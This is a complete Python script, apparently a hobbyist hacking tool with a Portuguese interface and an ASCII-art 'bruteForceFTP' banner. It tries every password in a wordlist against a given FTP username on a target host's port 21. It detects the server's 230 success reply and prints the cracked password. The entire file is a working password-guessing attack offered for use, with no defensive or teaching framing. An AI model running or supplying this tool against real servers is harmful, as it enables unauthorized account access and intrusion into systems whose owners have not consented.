#!/bin/python
import socket,sys,re
print("===================================================================================================")
print("____.                 __        ___________                       ________________________________")
print(" \_ |_________ __ ___/  |_  ____\_   _____/__________   ____  ____\_   _____/\__    ___/\_____    \ ")
print("  | __ \_  __ \  |  \   __\/ __ \|    __)/  _ \_  __ \_/ ___\/ __ \|    __)    |    |    |     ___/")
print("  | \_\ \  | \/  |  /|  | \  ___/|     \(  <_> )  | \/\  \__\  ___/|     \     |    |    |    |")
print("  |___  /__|  |____/ |__|  \___  >___  / \____/|__|    \___  >___  >___  /     |____|    |____|")
print("      \/ ")
print("=====================================Ric============================================================")
if len(sys.argv) != 3: 
        print("Modo de uso: python bruteForceFTP.py 127.0.0.1 usuario")
        sys.exit()
target = sys.argv[1]
usuario = sys.argv[2]

with open('worldlist.txt') as f:
    for palavra in f.readlines():
        palavra = palavra.strip()
        print("Realizando brute force FTP: %s:%s"%(usuario,palavra))
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,21))
        s.recv(1024)

        s.sendall(b"USER "+usuario.encode('utf-8') + b"\r\n")
        s.recv(1024)
        s.sendall(b"PASS "+palavra.encode('utf-8') + b"\r\n")
        resposta = s.recv(1024)
        print(resposta.decode('utf-8'))
        s.send(b"QUIT\r\n")

        if re.search('230', resposta.decode('utf-8')):
                print("[+] Senha encontrada --->", palavra)
                break
